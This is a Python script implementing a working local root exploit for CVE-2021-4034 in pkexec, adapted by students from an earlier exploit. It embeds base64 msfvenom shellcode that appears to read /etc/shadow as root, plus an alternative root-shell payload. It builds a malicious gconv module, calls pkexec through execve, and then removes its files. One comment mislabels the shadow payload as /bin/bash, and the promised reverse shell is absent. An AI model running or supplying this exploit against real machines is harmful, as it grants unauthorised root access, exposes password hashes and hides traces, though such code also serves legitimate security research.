#!/usr/bin/env python3

# CVE-2021-4034 in Python
# Originally by
# Joe Ammond (joe@ammond.org)
# https://haxx.in/files/blasty-vs-pkexec.c


# Modified by
# Wen Liang Goh (wlgoh.2020, SMU SCIS)
# Justin Lam (justin.lam.2020, SMU SCIS)
# Support for cleaning up and addition of reverse shell

import base64
import os
import sys
import shutil
import time

from ctypes import *
from ctypes.util import find_library

# msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=true | base64
payload_shadow = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0QEAAAAAAAAQAgAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVqO1iZSLsvYmluL3NoAFNIiedoLWMAAEiJ5lLoEAAAAGNhdCAvZXRjL3NoYWRv
dwBWV0iJ5g8F
'''

# msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=true | base64
payload_bash = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAywEAAAAAAAAEAgAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVqO1iZSLsvYmluL3NoAFNIiedoLWMAAEiJ5lLoCgAAAC9iaW4vYmFzaABWV0iJ
5g8F
'''

payload = base64.b64decode(payload_shadow)

# Set the environment for the call to execve()
environ = [
    b'exploit',
    b'PATH=GCONV_PATH=.',
    b'LC_MESSAGES=en_US.UTF-8',
    b'XAUTHORITY=../ErrorCausingCommand',
    None
]

def main():
    pid = os.fork()

    if pid == 0:
        # I am in the child process
        exploit_process()
    else:
        # I am in the parent process
        cleanup_process(pid)        

def exploit_process():
    # Find the C library to call execve() directly, as Python helpfully doesn't
    # allow us to call execve() with no arguments.
    try:
        libc = CDLL(find_library('c'))
    except:
        print('[!] Unable to find the C library, wtf?')
        sys.exit()

    # Create the shared library from the payload
    print('[+] Creating shared library for exploit code.')
    try:
        with open('payload.so', 'wb') as f:
            f.write(payload)
    except:
        print('[!] Failed creating payload.so.')
        sys.exit()
    os.chmod('payload.so', 0o0755)

    # make the GCONV_PATH directory
    try:
        os.mkdir('GCONV_PATH=.')
    except FileExistsError:
        print('[-] GCONV_PATH=. directory already exists, continuing.')
    except:
        print('[!] Failed making GCONV_PATH=. directory.')
        sys.exit()

    # Create a temp exploit file
    try:
        with open('GCONV_PATH=./exploit', 'wb') as f:
            f.write(b'')
    except:
        print('[!] Failed creating exploit file')
        sys.exit()
    os.chmod('GCONV_PATH=./exploit', 0o0755)

    # Create directory to hold gconf-modules configuration file
    try:
        os.mkdir('exploit')
    except FileExistsError:
        print('[-] exploit directory already exists, continuing.')
    except:
        print('[!] Failed making exploit directory.')
        sys.exit()

    # Create gconf config file
    try:
        with open('exploit/gconv-modules', 'wb') as f:
            f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n');
    except:
        print('[!] Failed to create gconf-modules config file.')
        sys.exit()

    # Convert the environment to an array of char*
    environ_p = (c_char_p * len(environ))()
    environ_p[:] = environ

    print('[+] Calling execve()')
    # Call execve() with NULL arguments
    libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)

def cleanup_process(child_pid):
    time.sleep(1)
    shutil.rmtree("exploit")
    shutil.rmtree("GCONV_PATH=.")
    if os.path.exists("payload.so"):
        os.remove("payload.so")
        
    # print("[+] Initiating cleanup procedure")
    exit_code = os.waitpid(child_pid, 0)
    print("[-] Shell exited with code:", exit_code)
    
    shutil.rmtree("exploit", ignore_errors=True)
    shutil.rmtree("GCONV_PATH=.", ignore_errors=True)
    if os.path.exists("payload.so"):
        os.remove("payload.so")


if __name__ == "__main__":
    main()
